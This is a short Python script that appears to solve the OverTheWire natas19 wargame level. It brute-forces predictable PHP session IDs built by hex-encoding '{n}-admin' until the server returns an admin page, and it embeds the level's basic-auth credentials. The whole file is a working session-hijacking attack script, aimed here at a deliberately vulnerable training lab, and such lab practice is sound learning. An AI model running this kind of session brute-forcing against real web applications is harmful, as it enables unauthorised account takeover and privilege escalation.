import requests  
from requests.auth import HTTPBasicAuth  

target='http://natas19.natas.labs.overthewire.org/index.php'
auth=('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
cookies=dict()
list=[str(s) for s in ['{}-admin'.format(x).encode('utf-8').hex() for x in range(640)]]

for x in list:
    cookies=dict(PHPSESSID=str(x))
    r=requests.get(target,auth=auth,cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
    

